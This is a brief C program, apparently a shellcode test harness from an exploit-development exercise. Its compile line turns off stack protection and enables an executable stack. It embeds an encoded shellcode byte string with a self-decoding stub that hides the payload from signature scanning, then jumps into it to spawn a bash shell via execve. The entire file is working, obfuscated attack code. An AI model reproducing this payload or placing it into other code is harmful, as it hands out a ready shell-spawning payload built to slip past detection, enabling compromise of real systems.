/*
 NOTExecveBashStack.c
By Abatchy
gcc NOTExecveBashStack.c -fno-stack-protector -z execstack -o NOTExecveBashStack.out
*/

#include <stdio.h>
#include <string.h>

unsigned char sc[] = "\xeb\x09\x5e\x80\x2e\x0d\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x3e\xcd\x5d\x75\x6f\x6e\x80\x75\x75\x6f\x76\x7b\x3c\x75\x3c\x3c\x3c\x3c\x96\xf0\x5d\x96\xef\x60\x96\xee\xbd\x18\xda\x8d\x0e";

int main()
{
    printf("Shellcode size: %d\n", strlen(sc));
    int (*ret)() = (int(*)())sc;
    ret();
}
